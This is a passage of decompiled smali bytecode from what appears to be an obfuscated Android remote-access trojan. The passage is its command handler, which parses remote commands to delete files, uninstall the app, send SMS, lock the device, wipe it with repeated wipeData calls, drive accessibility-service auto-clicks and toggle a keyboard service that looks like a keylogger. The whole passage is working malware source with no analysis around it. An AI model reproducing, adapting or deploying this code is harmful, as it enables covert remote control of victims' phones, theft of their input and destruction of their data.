    .line 686
    aget-object v0, v10, v8

    const-string v5, "SFD<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "SLF"

    .line 688
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2d

    const-string v5, "RE"

    .line 690
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_24 .. :try_end_24} :catch_15

    if-eqz v5, :cond_28

    .line 693
    :try_start_25
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    .line 694
    new-instance v6, Ljava/io/File;

    const-string v7, "/Config/sys/apps/rc"

    invoke-direct {v6, v5, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 695
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_28

    .line 696
    invoke-virtual {v6}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v5

    array-length v6, v5

    const/4 v7, 0x0

    :goto_8
    if-ge v7, v6, :cond_28

    aget-object v8, v5, v7

    .line 697
    invoke-virtual {v8}, Ljava/io/File;->isDirectory()Z

    move-result v9

    if-nez v9, :cond_27

    .line 698
    invoke-virtual {v8}, Ljava/io/File;->delete()Z
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_25 .. :try_end_25} :catch_15

    :cond_27
    add-int/lit8 v7, v7, 0x1

    goto :goto_8

    :catch_4
    :cond_28
    :try_start_26
    const-string v5, "FK"

    .line 704
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_26 .. :try_end_26} :catch_15

    if-eqz v5, :cond_2a

    .line 707
    :try_start_27
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    .line 708
    new-instance v6, Ljava/io/File;

    const-string v7, "/Config/sys/apps/log"

    invoke-direct {v6, v5, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 709
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_2a

    .line 710
    invoke-virtual {v6}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v5

    array-length v6, v5

    const/4 v7, 0x0

    :goto_9
    if-ge v7, v6, :cond_2a

    aget-object v8, v5, v7

    .line 711
    invoke-virtual {v8}, Ljava/io/File;->isDirectory()Z

    move-result v9

    if-nez v9, :cond_29

    .line 712
    invoke-virtual {v8}, Ljava/io/File;->delete()Z
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_5
    .catch Ljava/lang/OutOfMemoryError; {:try_start_27 .. :try_end_27} :catch_15

    :cond_29
    add-int/lit8 v7, v7, 0x1

    goto :goto_9

    :catch_5
    :cond_2a
    :try_start_28
    const-string v5, "TH"

    .line 718
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_28 .. :try_end_28} :catch_15

    if-eqz v0, :cond_2c

    .line 721
    :try_start_29
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    .line 722
    new-instance v5, Ljava/io/File;

    const-string v6, "/Config/sys/apps/tch"

    invoke-direct {v5, v0, v6}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 723
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_2c

    .line 724
    invoke-virtual {v5}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v0

    array-length v5, v0

    const/4 v6, 0x0

    :goto_a
    if-ge v6, v5, :cond_2c

    aget-object v7, v0, v6

    .line 725
    invoke-virtual {v7}, Ljava/io/File;->isDirectory()Z

    move-result v8

    if-nez v8, :cond_2b

    .line 726
    invoke-virtual {v7}, Ljava/io/File;->delete()Z
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_29 .. :try_end_29} :catch_15

    :cond_2b
    add-int/lit8 v6, v6, 0x1

    goto :goto_a

    .line 732
    :catch_6
    :cond_2c
    :try_start_2a
    aget-object v0, p1, v3

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->RemoveApp(Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 735
    :cond_2d
    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->RemoveApp(Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 739
    :cond_2e
    aget-object v5, v10, v8

    const-string v6, "ssms<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2a .. :try_end_2a} :catch_15

    if-eqz v5, :cond_2f

    .line 745
    :try_start_2b
    aget-object v0, v10, v8

    const-string v5, "ssms<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 746
    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 747
    aget-object v5, v0, v3

    .line 748
    aget-object v0, v0, v8

    .line 749
    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2b
    .catch Ljava/lang/Exception; {:try_start_2b .. :try_end_2b} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2b .. :try_end_2b} :catch_15

    goto/16 :goto_2a

    .line 755
    :cond_2f
    :try_start_2c
    aget-object v5, v10, v8

    const-string v6, "adm<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_32

    .line 756
    aget-object v0, v10, v8

    const-string v5, "adm<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "lck<*>"

    .line 757
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_2c
    .catch Ljava/lang/Exception; {:try_start_2c .. :try_end_2c} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2c .. :try_end_2c} :catch_15

    if-eqz v5, :cond_30

    .line 759
    :try_start_2d
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    const/4 v5, 0x0

    invoke-virtual {v0, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_af

    .line 763
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0}, Landroid/app/admin/DevicePolicyManager;->lockNow()V
    :try_end_2d
    .catch Ljava/lang/Exception; {:try_start_2d .. :try_end_2d} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2d .. :try_end_2d} :catch_15

    goto/16 :goto_2a

    :cond_30
    :try_start_2e
    const-string v5, "wip<*>"

    .line 770
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_2e
    .catch Ljava/lang/Exception; {:try_start_2e .. :try_end_2e} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2e .. :try_end_2e} :catch_15

    if-eqz v0, :cond_31

    .line 772
    :try_start_2f
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    const/4 v5, 0x0

    invoke-virtual {v0, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_af

    .line 777
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0, v8}, Landroid/app/admin/DevicePolicyManager;->wipeData(I)V

    .line 778
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0, v7}, Landroid/app/admin/DevicePolicyManager;->wipeData(I)V

    .line 779
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0, v14}, Landroid/app/admin/DevicePolicyManager;->wipeData(I)V

    goto/16 :goto_2a

    .line 787
    :cond_31
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->access$000()V
    :try_end_2f
    .catch Ljava/lang/Exception; {:try_start_2f .. :try_end_2f} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2f .. :try_end_2f} :catch_15

    goto/16 :goto_2a

    .line 793
    :cond_32
    :try_start_30
    aget-object v5, v10, v8

    const-string v6, "Aclk<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_30 .. :try_end_30} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_30 .. :try_end_30} :catch_15

    if-eqz v5, :cond_35

    .line 797
    :try_start_31
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x18

    if-lt v0, v5, :cond_af

    .line 798
    aget-object v0, v10, v8

    const-string v5, "Aclk<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "{"

    .line 799
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_33

    const-string v5, "{"

    .line 800
    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "}"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, ","

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 801
    aget-object v5, v0, v8

    .line 802
    aget-object v0, v0, v3

    .line 803
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v6, :cond_af

    .line 804
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-virtual {v6, v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->TouchWatcher(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2a

    :cond_33
    const-string v5, "[L]"

    .line 805
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_34

    .line 806
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->appContext:Landroid/content/Context;

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->GetTouchesNames(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 807
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->AtuoClickerM:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "[L]"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 809
    :cond_34
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v5, :cond_af

    .line 810
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-virtual {v5, v0, v11}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->TouchWatcher(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_31
    .catch Ljava/lang/Exception; {:try_start_31 .. :try_end_31} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_31 .. :try_end_31} :catch_15

    goto/16 :goto_2a

    .line 816
    :cond_35
    :try_start_32
    aget-object v5, v10, v8

    const-string v6, "KBO<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_32 .. :try_end_32} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_32 .. :try_end_32} :catch_15

    const-string v6, "0>"

    const-string v14, "1>"

    if-eqz v5, :cond_3c

    .line 819
    :try_start_33
    aget-object v0, v10, v8

    const-string v5, "KBO<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "lod"

    .line 820
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_38

    .line 822
    aget-object v0, p1, v3

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/PermissionsManager;->isinputon(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_36

    .line 823
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_b

    .line 825
    :cond_36
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 827
    :goto_b
    sget-boolean v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/KeyboardService;->isactive:Z

    if-eqz v5, :cond_37

    .line 831
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_c

    .line 833
    :cond_37
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 836
    :goto_c
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->Mykeyboard:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "PR:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    :cond_38
    const-string v5, "AKP"

    .line 838
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_39

    .line 839
    aget-object v0, p1, v3

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/PermissionsManager;->isinputon(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_af

    .line 841
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-direct {v0, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 842
    new-instance v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_$1;

    invoke-direct {v5, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_$1;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;)V

    invoke-virtual {v0, v5}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_2a

    :cond_39
    const-string v5, "AKA"

    .line 860
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3a

    .line 861
    sget-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/KeyboardService;->isactive:Z

    if-nez v0, :cond_af

    .line 865
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-direct {v0, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 866
    new-instance v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_$2;

    invoke-direct {v5, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_$2;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;)V

    invoke-virtual {v0, v5}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_2a

    :cond_3a
    const-string v5, "ENB:"

    .line 885
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_af

    const-string v5, "ENB:"

    .line 886
    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "1"

    .line 887
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3b

    .line 888
    sput-boolean v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/KeyboardService;->isalive:Z

    goto/16 :goto_2a

    .line 890
    :cond_3b
    sput-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/KeyboardService;->isalive:Z
    :try_end_33
    .catch Ljava/lang/Exception; {:try_start_33 .. :try_end_33} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_33 .. :try_end_33} :catch_15

    goto/16 :goto_2a

    .line 899
    :cond_3c
    :try_start_34
    aget-object v5, v10, v8

    const-string v12, "RPM<*>"

    invoke-virtual {v5, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_34
    .catch Ljava/lang/Exception; {:try_start_34 .. :try_end_34} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_34 .. :try_end_34} :catch_15

    if-eqz v5, :cond_5c

    .line 901
    :try_start_35
    aget-object v5, v10, v8

    const-string v9, "RPM<*>"

    invoke-virtual {v5, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    const-string v9, "[lod]"

    .line 903
    invoke-virtual {v5, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    const/16 v10, 0x1a

    if-eqz v9, :cond_4e

    .line 904
    aget-object v0, p1, v3

    const-class v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

